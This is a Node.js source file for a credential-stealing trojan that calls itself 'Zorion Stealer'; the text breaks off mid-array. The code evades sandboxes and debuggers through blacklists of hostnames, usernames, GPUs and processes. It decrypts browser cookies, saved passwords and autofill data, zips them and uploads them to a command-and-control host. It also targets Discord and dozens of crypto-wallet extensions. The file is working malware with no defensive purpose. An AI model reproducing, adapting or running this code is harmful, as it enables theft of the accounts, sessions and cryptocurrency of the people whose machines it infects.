

const util = require('util');
const fs = require('fs-extra');
const readFileAsync = util.promisify(fs.readFile);
const fspromises = require('fs-extra').promises;
const path = require('path');
const httpx = require('axios');
const axios = require('axios');
const os = require('os');
const FormData = require('form-data');
const AdmZip = require('adm-zip');
const { execSync, exec } = require('child_process');
const crypto = require('crypto');
const sqlite3 = require('sqlite3');
const tmpdir = os.tmpdir();
const { join } = require('path');
const { createDecipheriv } = require('crypto');
const { userInfo } = require('os');
const { existsSync, readFileSync, copyFileSync, writeFileSync, mkdirSync, createReadStream } = require('fs');
const { Database } = require('sqlite3');
const archiver = require('archiver');

const local = process.env.LOCALAPPDATA;
const discords = [];
debug = false;
let injection_paths = []

var appdata = process.env.APPDATA,
    localappdata = process.env.LOCALAPPDATA;

const blackListedHostname = ["BEE7370C-8C0C-4", "AppOnFly-VPS","tVaUeNrRraoKwa", "vboxuser", "fv-az269-80", "DESKTOP-Z7LUJHJ", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I",  "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
const blackListedUsername = ["WDAGUtilityAccount", "runneradmin", "Abby", "Peter Wilson", "hmarc", "patex", "aAYRAp7xfuo", "JOHN-PC", "FX7767MOR6Q6", "DCVDY", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "vboxuser", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "lbeld", "od8m", "Julia", "HEUeRzl", ]
const blackListedGPU = ["Microsoft Remote Display Adapter", "Microsoft Hyper-V Video", "Microsoft Basic Display Adapter", "VMware SVGA 3D", "Standard VGA Graphics Adapter", "NVIDIA GeForce 840M", "NVIDIA GeForce 9400M", "UKBEHH_S", "ASPEED Graphics Family(WDDM)", "H_EDEUEK", "VirtualBox Graphics Adapter", "K9SC88UK", "Стандартный VGA графический адаптер", ]
const blacklistedOS = ["Windows Server 2022 Datacenter", "Windows Server 2019 Standard", "Windows Server 2019 Datacenter", "Windows Server 2016 Standard", "Windows Server 2016 Datacenter"]
const blackListedProcesses = ["watcher.exe", "mitmdump.exe", "mitmproxy.exe", "mitmweb.exe", "Insomnia.exe", "HTTP Toolkit.exe", "Charles.exe", "Postman.exe", "BurpSuiteCommunity.exe", "Fiddler Everywhere.exe", "Fiddler.WebUi.exe", "processhacker.exe", "HTTPDebuggerUI.exe", "HTTPDebuggerSvc.exe", "HTTPDebuggerPro.exe", "x64dbg.exe", "Ida.exe", "Ida64.exe", "Progress Telerik Fiddler Web Debugger.exe", "HTTP Debugger Pro.exe", "Fiddler.exe", "KsDumperClient.exe", "KsDumper.exe", "FolderChangesView.exe", "BinaryNinja.exe", "Cheat Engine 6.8.exe", "Cheat Engine 6.9.exe", "Cheat Engine 7.0.exe", "Cheat Engine 7.1.exe", "Cheat Engine 7.2.exe", "OllyDbg.exe", "Wireshark.exe",];

function checkListed(arr, value) {
    return arr.includes(value);
}

function executeCommand(command, callback) {
    exec(command, (error, stdout, stderr) => {
        callback(stdout.trim());
    });
}

function usernamecheck(callback) {
    const userName = process.env['USERPROFILE'].split(path.sep)[2];
    if (checkListed(blackListedUsername, userName)) {
        exitProcess();
    } else {
        hostnamecheck(callback);
    }
}

function hostnamecheck(callback) {
    const hostName = os.hostname();
    if (checkListed(blackListedHostname, hostName)) {
        exitProcess();
    } else {
        bioscheck(callback);
    }
}

function bioscheck(callback) {
    executeCommand('wmic bios get smbiosbiosversion', (stdout) => {
        if (stdout.includes("Hyper-V")) {
            exitProcess();
        } else {
            speedcheck(callback);
        }
    });
}


function processCheck(callback) {
    executeCommand('tasklist /fo csv', (stdout) => {
        const processes = stdout.split('\r\n').map(line => {
            const cols = line.split('","');
            return cols[0].replace('"', '');
        });

        for (const processName of blackListedProcesses) {
            if (processes.includes(processName)) {
                exitProcess();
                return;
            }
        }

        callback();
    });
}

function speedcheck(callback) {
    executeCommand('wmic MemoryChip get /format:list | find /i "Speed"', (stdout) => {
        if (stdout.includes("Speed=0")) {
            exitProcess();
        } else {
            gpucheck(callback);
        }
    });
}

function gpucheck(callback) {
    executeCommand('wmic path win32_VideoController get name', (stdout) => {
        const gpuList = stdout.split(",").map(gpu => gpu.trim());
        if (checkListed(blackListedGPU, gpuList)) {
            exitProcess();
        } else {
            oscheck(callback);
        }
    });
}

function oscheck(callback) {
  executeCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName", (stdout) => {
      const osp = stdout.trim();
      if (checkListed(blacklistedOS, osp)) {
          exitProcess();
      } else {
          ramcheck(callback);
      }
  });
}
function ramcheck(callback) {
  const totalRAM = os.totalmem();
  if (totalRAM > 1200) {
      usernamecheck(callback);
  } else {
  }
}


function exitProcess() {
 
  process.kill(process.pid, 'SIGKILL'); 
  
}

//ramcheck();


const tempDir = os.tmpdir();


const options = {
    api: 'https://C2_IP',
    Key: 'ZORION-WEEKLY-YE71OVZ1Y3N819O0'
};

const keywords = [
    'gmail.com',
    'live.com',
    'zoho.com',
    'yahoo.com',
    'icloud.com',
    'protonmail.com',
    'mailbox.org',
    'mail.yandex.com',
    'youtube.com',
    'tiktok.com',
    'yahoo.com',
    'coinbase',
    'binance',
    'ogu.gg',
    'g2g.com',
    'minecraft.net',
    'instagram.com',
    'hotmail.com',
    'facebook.com',
    'riotgames.com',
    'mega.nz',
    'roblox.com',
    'godaddy.com',
    'accounts.google.com',
    'aternos.org',
    'hostinger.com',
    'hostgator.com',
    'whois.com',
    'mojang.com',
    'contabo.com',
    'ovhcloud.com',
    'spotify.com',
    'messenger.com',
    'snapchat.com',
    'steamcommunity.com',
    'epicgames.com',
    '0x00sec.org',
    'greysec.net',
    'twitter.com',
    'reddit.com',
    'amazon.com',
    'eulencheats.com',
    'coinbase.com',
    'binance.us',
    'nordvpn.com',
    'netflix.com',
    'twitch.tv'
]

async function browserCookies(path) {
    const cookies = [];
  
    if (existsSync(path)) {
        let path_split = path.split('\\');
        let path_st = path.includes('Network') ? path_split.slice(0, -3) : path_split.slice(0, -2);
        let path_t = path_st.join('\\') + '\\';

        if (path.startsWith(process.env.APPDATA)) path_t = path;

        if (existsSync(join(path, 'Network')) && existsSync(join(path_t, 'Local State'))) {
            const encrypted = Buffer.from(JSON.parse(readFileSync(join(path_t, 'Local State'), 'utf-8')).os_crypt.encrypted_key, 'base64').slice(5);
            const key = dojka.unprotectData(encrypted, null, 'CurrentUser');

            const result = await new Promise((resolve) => {
                if (!existsSync(join(path, 'Network', 'Cookies'))) return;

                const database = new Database(join(path, 'Network', 'Cookies'));
                database.each('SELECT * from cookies', async function (err, row) {
                    if (!row.encrypted_value) return;

                    const encrypted_value = row.encrypted_value;
                    let decrypted;
                    if (encrypted_value[0] === 1 && encrypted_value[1] === 0 && encrypted_value[2] === 0 && encrypted_value[3] === 0) {
                        decrypted = dojka.unprotectData(encrypted_value, null, 'CurrentUser');
                    } else {
                        const start = encrypted_value.slice(3, 15);
                        const middle = encrypted_value.slice(15, -16);
                        const end = encrypted_value.slice(-16);
                        if (start.length !== 12) {
                            console.error('Invalid IV length:', start.length);
                            return;
                        }
                        const decipher = createDecipheriv('aes-256-gcm', key, start);

                        decipher.setAuthTag(end);
                        decrypted = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
                    }

                    let browser = path.includes('Local') ? path.split('\\Local\\')[1].split('\\')[1] : path.split('\\Roaming\\')[1].split('\\')[1];
                    if (path.includes('Profile')) browser = `${browser} ${path.split('\\User Data')[1].replaceAll('\\', '')}`;

                    if (cookies.find((c) => c.browser === browser)) {
                        cookies.find((c) => c.browser === browser).list.push(`${row.host_key}	TRUE	/	FALSE	2597573456	${row.name}	${decrypted}`);
                    } else {
                        cookies.push({
                            browser: browser,
                            list: [`${row.host_key}	TRUE	/	FALSE	2597573456	${row.name}	${decrypted}`]
                        });
                    }
                }, function () {
                    resolve({ cookies });
                    database.close();
                });
            });
            return result;
        }
    }
}

async function getBrowserCookies() {
    const cookies_list = [];

    try {
        const response = await axios.get(`${options.api}/paths`);
        const data = response.data;
        await kill(data.browsersProcesses);

        const paths = data.browsers.map((p) => p.replace('appdata', process.env.LOCALAPPDATA).replace('roaming', process.env.APPDATA));

        for (const path of paths) {
            if (!path.includes('Firefox')) {
                try {
                    const cookies = await browserCookies(path);

                    if (cookies.cookies[0].browser && cookies.cookies[0].list) {
                        cookies_list.push({
                            browser: cookies.cookies[0].browser,
                            list: cookies.cookies[0].list
                        });
                    }
                } catch (e) {
                    console.log(e)
                }
            } else {
                try {
                    const firefox_cookies = await getFirefoxCookies(path);
                    if (firefox_cookies) {
                        cookies_list.push({
                            browser: 'Firefox',
                            list: firefox_cookies[0].list
                        });
                    }
                } catch (e) {
                    console.log(e)
                }
            }
        }
    } catch (error) {
        console.error(error);
    }
    return { cookies_list };
}

async function getFirefoxCookies(path) {
    const cookies = [];
    if (existsSync(path)) {
        const cookiesFile = execSync('where /r . cookies.sqlite', { cwd: path }).toString();
        const result = await new Promise((res) => {
            const database = new Database(cookiesFile.trim());
            database.each('SELECT * FROM moz_cookies', async function (err, row) {
                if (!row.value) return;
                if (cookies.find((c) => c.browser === 'Firefox')) {
                    cookies.find((c) => c.browser === 'Firefox').list.push(`${row.host}\t${row.expiry === 0 ? 'FALSE' : 'TRUE'}\t${row.path}\t${row.host.startsWith('.') ? 'FALSE' : 'TRUE'}\t${row.expiry}\t${row.name}\t${row.value}`);
                } else {
                    cookies.push({ browser: 'Firefox', list: [`${row.host}\t${row.expiry === 0 ? 'FALSE' : 'TRUE'}\t${row.path}\t${row.host.startsWith('.') ? 'FALSE' : 'TRUE'}\t${row.expiry}\t${row.name}\t${row.value}`] });
                }
            }, function () {
                res(cookies);
                database.close();
            });
        });
        return result;
    }
}

async function browserPasswords(path) {

    const passwords = [];
    if (existsSync(path)) {
        let path_split = path.split('\\');
        let path_st = path.includes('Network') ? path_split.slice(0, -3) : path_split.slice(0, -2);
        let path_t = path_st.join('\\') + '\\';

        if (path.startsWith(process.env.APPDATA)) path_t = path;

        if (existsSync(join(path, 'Network')) && existsSync(join(path_t, 'Local State'))) {
            const encrypted = Buffer.from(JSON.parse(readFileSync(join(path_t, 'Local State'), 'utf-8')).os_crypt.encrypted_key, 'base64').slice(5);
            const key = dojka.unprotectData(encrypted, null, 'CurrentUser');
            if (!existsSync(join(path, 'Login Data'))) return;

            copyFileSync(join(path, 'Login Data'), join(path, 'passwords.db'));

            const result = await new Promise((resolve) => {
                if (!existsSync(join(path, 'passwords.db'))) return;

                const database = new Database(join(path, 'passwords.db'));
                database.each('SELECT origin_url, username_value, password_value FROM logins', async function (err, row) {
                    if (!row.username_value) return;

                    const start = row.password_value.slice(3, 15);
                    const middle = row.password_value.slice(15, row.password_value.length - 16);
                    const end = row.password_value.slice(row.password_value.length - 16);
                    if (start.length !== 12) {
                        console.error('Invalid IV length:', start.length);
                        return;
                    }
                    const decipher = createDecipheriv('aes-256-gcm', key, start);
                    decipher.setAuthTag(end);
                    const decrypted = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');

                    let browser = path.includes('Local') ? path.split('\\Local\\')[1].split('\\')[1] : path.split('\\Roaming\\')[1].split('\\')[1];
                    if (path.includes('Profile')) browser = `${browser} ${path.split('\\User Data')[1].replaceAll('\\', '')}`;

                    if (passwords.find((p) => p.browser === browser)) {
                        passwords.find((p) => p.browser === browser).list.push(`${row.origin_url} | ${row.username_value} | ${decrypted}`);
                    } else {
                        passwords.push({
                            browser: browser,
                            list: [`${row.origin_url} | ${row.username_value} | ${decrypted}`]
                        });
                    }
                }, function () {
                    resolve({ passwords });
                    database.close();
                });
            });
            return result;
        }
    }
}

async function getBrowserPasswords() {
    const passwords_list = [];

    try {
        const response = await axios.get(`${options.api}/paths`);
        const data = response.data;
        await kill(data.browsersProcesses);

        const paths = data.browsers.map((p) => p.replace('appdata', process.env.LOCALAPPDATA).replace('roaming', process.env.APPDATA));

        for (const path of paths) {
            try {
                const passwords = await browserPasswords(path);
                if (passwords.passwords[0].browser && passwords.passwords[0].list) {
                    passwords_list.push({
                        browser: passwords.passwords[0].browser,
                        list: passwords.passwords[0].list
                    });
                }
            } catch (e) {
                console.log(e)
            }
        }
    } catch (error) {
        console.error(error);
    }
    return { passwords_list };
}

async function browserAutofills(path) {
    const autofills = [];
    if (existsSync(path)) {
        if (existsSync(join(path, 'Web Data'))) {
            const result = await new Promise((resolve) => {
                const database = new Database(join(path, 'Web Data'));
                database.each('SELECT * FROM autofill', async function (err, row) {
                    let browser = path.includes('Local') ? path.split('\\Local\\')[1].split('\\')[1] : path.split('\\Roaming\\')[1].split('\\')[1];
                    if (path.includes('Profile')) browser = `${browser} ${path.split('\\User Data')[1].replaceAll('\\', '')}`;

                    if (autofills.find((a) => a.browser === browser)) {
                        autofills.find((a) => a.browser === browser).list.push(`${row.name} | ${row.value}`);
                    } else {
                        autofills.push({
                            browser: browser,
                            list: [`${row.name} | ${row.value}`]
                        });
                    }
                }, function () {
                    resolve({ autofills });
                    database.close();
                });
            });
            return result;
        }
    }
}

async function getBrowserAutofills() {
    const autofills_list = [];

    try {
        const response = await axios.get(`${options.api}/paths`);
        const data = response.data;
        await kill(data.browsersProcesses);

        const paths = data.browsers.map((p) => p.replace('appdata', process.env.LOCALAPPDATA).replace('roaming', process.env.APPDATA));

        for (const path of paths) {
            try {
                const autofills = await browserAutofills(path);
                if (autofills.autofills[0].browser && autofills.autofills[0].list) {
                    autofills_list.push({
                        browser: autofills.autofills[0].browser,
                        list: autofills.autofills[0].list
                    });
                }
            } catch (e) {
                console.log(e)
            }
        }
    } catch (error) {
        console.error(error);
    }
    return { autofills_list };
}



async function uploadFileToCustomAPI2(filePath) {
    const formData = new FormData();
    formData.append('file', fs.createReadStream(filePath));
    formData.append('key', options.Key); 

    try {
        const response = await axios.post('https://C2_IP/uploadlogs', formData, {
            headers: {
                'Content-Type': 'multipart/form-data', 
                ...formData.getHeaders(),
            },
            maxContentLength: Infinity,
            maxBodyLength: Infinity,
        });

        if (response.status !== 200) {
            throw new Error('Failed to upload file');
        }

        const filelink = response.data.link;

        return filelink; 
    } catch (error) {
        throw new Error(`There was an error loading the file: ${error.message}`);
    }
}


async function allBrowserData() {



    const { cookies_list } = await getBrowserCookies();
    const { autofills_list } = await getBrowserAutofills();
    const { passwords_list } = await getBrowserPasswords();

    const zip = new AdmZip();
    const randomStr = crypto.randomBytes(12).toString('hex');
    const tempDirPath = join(tempDir, randomStr);

    mkdirSync(tempDirPath);

    const autofillDir = join(tempDirPath, 'Autofill');
    const cookiesDir = join(tempDirPath, 'Cookies');
    const passwordsDir = join(tempDirPath, 'Passwords');
    mkdirSync(autofillDir);
    mkdirSync(cookiesDir);
    mkdirSync(passwordsDir);

    for (const autofill of autofills_list) {
        const autofillPath = join(autofillDir, `${autofill.browser}.txt`);
        writeFileSync(autofillPath, autofill.list.join('\n'), 'utf-8');
    }

    for (const cookie of cookies_list) {
        const cookiesPath = join(cookiesDir, `${cookie.browser}.txt`);
        writeFileSync(cookiesPath, cookie.list.join('\n'), 'utf-8');
    }

    for (const password of passwords_list) {
        const passwordsPath = join(passwordsDir, `${password.browser}.txt`);
        writeFileSync(passwordsPath, password.list.join('\n'), 'utf-8');
    }

    zip.addLocalFolder(tempDirPath);
    zip.writeZip(`${tempDirPath}.zip`);

    const filelink = await uploadFileToCustomAPI2(`${tempDirPath}.zip`);
    if (filelink) {
      const find_keywords = cookies_list.map((c) => c?.list?.join('\n'));

        const data = {
            content: `Zorion Stealer ✝ - (Browser Data)

\`\`\`🍪 Cookies (${cookies_list.length})
👀 Autofills (${autofills_list.length})
🔑 Passwords (${passwords_list.length}\`\`\`

[download here!](${filelink}) 

\`\`\`${keywords.filter((x) => find_keywords.join('\n').includes(x)).join(', ').replaceAll('.com', '').replaceAll('.net', '').replaceAll('.tv', '') || 'No Keywords Found.'}\`\`\` `,
            key: options.Key
        };
        const randomStringq = crypto.randomBytes(16).toString('hex');
          
        await axios.post(`https://C2_IP/sendmessagebd/${randomStringq}`, data);   }

    try {
       
    } catch (e) {
        console.error('Error cleaning up temporary files:', e);
    }
}

async function kill(processes) {
    return new Promise((resolve) => {
        const tasks = execSync('tasklist').toString().toLowerCase();
        processes = processes.filter(task => tasks.includes(task));
        processes.forEach((task) => exec(`taskkill /f /im ${task}.exe`));
        resolve();
    });
}


paths = [
    appdata + '\\discord\\',
    appdata + '\\discordcanary\\',
    appdata + '\\discordptb\\',
    appdata + '\\discorddevelopment\\',
    appdata + '\\lightcord\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
    appdata + '\\Opera Software\\Opera Stable\\',
    appdata + '\\Opera Software\\Opera GX Stable\\',
    localappdata + '\\Opera Software\\Opera Stable\\',
    localappdata + '\\Opera Software\\Opera GX Stable\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
];

function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}

const key = 'ZORION-WEEKLY-YE71OVZ1Y3N819O0';
const exename = 'ocwizard';


  const config = {
    "logout": "instant",
    "inject-notify": "true",
    "logout-notify": "true",
    "init-notify": "false",
    "embed-color": 3553599,
    "disable-qr-code": "true"
}

const _0x9b6227 = {}
_0x9b6227.passwords = 0
_0x9b6227.cookies = 0
_0x9b6227.autofills = 0
_0x9b6227.wallets = 0
const count = _0x9b6227,
user = {
    ram: os.totalmem(),
    version: os.version(),
    uptime: os.uptime,
    homedir: os.homedir(),
    hostname: os.hostname(),
    userInfo: os.userInfo().username,
    type: os.type(),
    arch: os.arch(),
    release: os.release(),
    roaming: process.env.APPDATA,
    local: process.env.LOCALAPPDATA,
    temp: process.env.TEMP,
    countCore: process.env.NUMBER_OF_PROCESSORS,
    sysDrive: process.env.SystemDrive,
    fileLoc: process.cwd(),
    randomUUID: crypto.randomBytes(16).toString('hex'),
    start: Date.now(),
    debug: false,
    copyright: '<================[ Stealit ]================>\n\n',
    url: null,
}
_0x2afdce = {}
const walletPaths = _0x2afdce,
    _0x4ae424 = {}
_0x4ae424.Trust = '\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph'
_0x4ae424.Metamask =
    '\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn'
_0x4ae424.Coinbase =
    '\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad'
_0x4ae424.BinanceChain =
    '\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp'
_0x4ae424.Phantom =
    '\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa'
_0x4ae424.TronLink =
    '\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec'
_0x4ae424.Ronin = '\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec'
_0x4ae424.Exodus =
    '\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno'
_0x4ae424.Coin98 =
    '\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg'
_0x4ae424.Authenticator =
    '\\Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai'
_0x4ae424.MathWallet =
    '\\Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc'
_0x4ae424.YoroiWallet =
    '\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb'
_0x4ae424.GuardaWallet =
    '\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln'
_0x4ae424.JaxxxLiberty =
    '\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne'
_0x4ae424.Wombat =
    '\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih'
_0x4ae424.EVERWallet =
    '\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk'
_0x4ae424.KardiaChain =
    '\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk'
_0x4ae424.XDEFI = '\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf'
_0x4ae424.Nami = '\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo'
_0x4ae424.TerraStation =
    '\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp'
_0x4ae424.MartianAptos =
    '\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk'
_0x4ae424.TON = '\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd'
_0x4ae424.Keplr = '\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap'
_0x4ae424.CryptoCom =
    '\\Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj'
_0x4ae424.PetraAptos =
    '\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci'
_0x4ae424.OKX = '\\Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge'
_0x4ae424.Sollet =
    '\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno'
_0x4ae424.Sender =
    '\\Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg'
_0x4ae424.Sui = '\\Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil'
_0x4ae424.SuietSui =
    '\\Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd'
_0x4ae424.Braavos =
    '\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma'
_0x4ae424.FewchaMove =
    '\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj'
_0x4ae424.EthosSui =
    '\\Local Extension Settings\\mcbigmjiafegjnnogedioegffbooigli'
_0x4ae424.ArgentX =
    '\\Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb'
_0x4ae424.NiftyWallet =
    '\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid'
_0x4ae424.BraveWallet =
    '\\Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl'
_0x4ae424.EqualWallet =
    '\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac'
_0x4ae424.BitAppWallet =
    '\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi'
_0x4ae424.iWallet =
    '\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj'
_0x4ae424.AtomicWallet =
    '\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh'
_0x4ae424.MewCx = '\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm'
_0x4ae424.GuildWallet =
    '\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj'
_0x4ae424.SaturnWallet =
    '\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig'
_0x4ae424.HarmonyWallet =
    '\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib'
_0x4ae424.PaliWallet =
    '\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn'
_0x4ae424.BoltX = '\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca'
_0x4ae424.LiqualityWallet =
    '\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn'
_0x4ae424.MaiarDeFiWallet =
    '\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm'
_0x4ae424.TempleWallet =
    '\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc'
_0x4ae424.Metamask_E =
    '\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm'
_0x4ae424.Ronin_E =
    '\\Local Extension Settings\\kjmoohlgokccodicjjfebfomlbljgfhk'
_0x4ae424.Yoroi_E =
    '\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb'
_0x4ae424.Authenticator_E =
    '\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio'
_0x4ae424.MetaMask_O =
    '\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci'

const extension = _0x4ae424,
  browserPath = [
    [
      user.local + '\\Google\\Chrome\\User Data\\Default\\',
      'Default',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
      'Default',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
